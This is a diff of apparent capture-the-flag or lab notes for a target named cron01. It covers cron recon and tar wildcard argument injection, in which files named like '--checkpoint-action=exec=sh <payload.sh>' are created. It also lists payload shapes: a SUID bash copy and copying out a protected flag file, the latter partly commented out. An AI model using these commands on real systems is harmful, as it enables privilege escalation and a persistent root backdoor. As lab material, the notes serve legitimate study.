@@ -2,23 +2,23 @@
 
 ## Targets
 
-- **cron01** — SSH + an aggressive backup schedule
+- **cron01** — SSH + an open backup share + an aggressive schedule
 
 ## Useful commands
 
 ```bash
-# loot + schedule recon
-grep -rIlnE 'passw|cred' /var/backups /etc /opt 2>/dev/null
+curl http://<cron01>/                      # the backup share is web-readable
 cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
 crontab -l; systemctl list-timers --all
 
 # filenames as arguments — end-of-options discipline for yourself
+cd <archived-dir>
 touch -- '--checkpoint=1'
-touch -- '--checkpoint-action=exec=sh /home/ops/pwn.sh'
+touch -- '--checkpoint-action=exec=sh <payload.sh>'
 
 # payload shapes people use
-cp /bin/bash /tmp/rbash && chmod +s /tmp/rbash    # suid shell
-cp /root/root.txt /tmp/ && chmod 644 /tmp/root.txt # direct flag grab
+#   cp /bin/bash /tmp/rbash && chmod +s /tmp/rbash    — suid shell
+#   cp <protected-file> /tmp/ && chmod 644 /tmp/<f>   — direct grab
 ```
 
 ## Concepts
